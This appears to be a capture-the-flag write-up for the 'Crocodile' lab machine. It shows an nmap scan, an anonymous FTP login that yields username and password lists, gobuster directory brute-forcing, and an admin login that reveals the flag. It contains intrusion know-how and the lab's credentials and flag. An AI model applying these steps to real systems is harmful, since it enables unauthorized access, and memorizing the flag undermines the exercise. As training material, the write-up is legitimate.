@@ -1,0 +1,137 @@
+Machine : Crocodile
+IP : 
+Objective : Root Flag
+
+
+NMAP SCAN
+$ nmap -A 10.129.1.15 --min-rate 5000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 06:01 EDT
+Nmap scan report for 10.129.1.15
+Host is up (0.38s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.53
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Smash - Bootstrap Business Template
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: OS: Unix
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   403.74 ms 10.10.14.1
+2   403.21 ms 10.129.1.15
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.40 seconds
+
+
+The there is a ftp server running or port 21, now we can try doing defaults and anonymous logins
+
+$ ftp 10.129.1.15
+
+type 'anonymous' or 'ftp' for anonymous login.
+
+30 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||41621|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+ftp> get allowed.userlist
+local: allowed.userlist remote: allowed.userlist
+229 Entering Extended Passive Mode (|||45186|)
+150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+100% |***********************************************************************************************************************************************************************************************|    33       16.78 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.07 KiB/s)
+ftp> get allowed.userlist.passwd
+local: allowed.userlist.passwd remote: allowed.userlist.passwd
+229 Entering Extended Passive Mode (|||49670|)
+150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+100% |***********************************************************************************************************************************************************************************************|    62      118.25 KiB/s    00:00 ETA
+226 Transfer complete.
+62 bytes received in 00:00 (0.11 KiB/s)
+
+Looking at the downloaded file we have a set of usernames and their passwords
+└─$ cat allowed.userlist
+aron
+pwnmeow
+egotisticalsw
+admin
+                                                                                                                                                                                                                                            
+└─$ cat allowed.userlist.passwd 
+root
+Supersecretpassword1
+@BaASD&9032123sADS
+rKXM59ESxesUFHAd
+
+Also while looking at the nmap scan we have a website running  on port 80. After Further Analysis I found that it is just a random small website.
+But lets try brute forcing directories to see if there is any admin portal active.
+
+└─$ gobuster dir -u http://10.129.1.15/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php -t 50
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.1.15/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 311] [--> http://10.129.1.15/assets/]
+/dashboard            (Status: 301) [Size: 314] [--> http://10.129.1.15/dashboard/]
+/login.php            (Status: 200) [Size: 1577]
+/config.php           (Status: 200) [Size: 0]
+/css                  (Status: 301) [Size: 308] [--> http://10.129.1.15/css/]
+/js                   (Status: 301) [Size: 307] [--> http://10.129.1.15/js/]
+Progress: 30128 / 283414 (10.63%)^C
+
+Looks like we have a /login.php
+
+and we can login with the credentials we foudn earlier:
+username : admin
+password : rKXM59ESxesUFHAd
+
+and thats login successful
+
+and in the dashboard itself we have the flag:
+
+flag: c7110277ac44d78b6a9fff2232434d16
+
+
+
+
+
+
+
+
